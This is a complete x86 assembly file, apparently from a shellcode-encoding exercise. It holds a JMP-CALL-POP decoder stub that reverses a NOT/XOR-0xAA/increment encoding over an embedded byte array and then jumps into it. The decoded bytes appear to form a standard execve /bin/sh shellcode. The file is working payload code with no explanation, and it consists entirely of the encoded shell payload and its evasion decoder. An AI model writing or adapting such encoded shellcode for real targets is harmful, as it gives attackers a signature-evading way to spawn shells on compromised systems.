global _start			

section .text
_start:

	jmp short call_shellcode

decoder_setup:

	pop esi			; pop shellcode into esi

decode:

	cmp byte [esi], 0xAA	; compare current esi byte with our 0xaa marker
	jz shellcode		; if compare succeeds, jump to shellcode
	not byte [esi]		; NOT operation of current byte in esi
	xor byte [esi], 0xAA	; XOR with 0xaa
	inc byte [esi]		; increment by 1
	inc esi			; move to next byte in esi
	jmp short decode	; jump back to start of decode

call_shellcode:

	call decoder_setup	; pushes shellcode to stack and jumps to decoder_setup

	shellcode: db 0x65,0xea,0x1a,0x32,0x7b,0x7b,0x27,0x32,0x32,0x7b,0x34,0x3d,0x38,0xdd,0xb7,0x1a,0xdd,0xb4,0x07,0xdd,0xb5,0xfa,0x5f,0x99,0x2a, 0xaa
